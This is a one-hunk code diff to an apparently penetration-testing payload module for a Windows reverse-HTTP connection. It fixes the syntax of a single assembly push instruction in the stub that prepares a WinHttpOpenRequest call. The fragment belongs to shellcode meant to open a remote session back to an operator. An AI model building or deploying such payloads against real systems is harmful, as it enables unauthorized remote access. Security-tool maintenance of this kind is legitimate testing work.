@@ -187,7 +187,7 @@ module Payload::Windows::ReverseWinHttp
 
       WinHttpOpenRequest:
 
-        push.i32 #{"0x%.8x" % http_open_flags}
+        push #{"0x%.8x" % http_open_flags}
         push ebx               ; AcceptTypes (NULL)
         push ebx               ; Referrer (NULL)
         push ebx               ; Version (NULL)
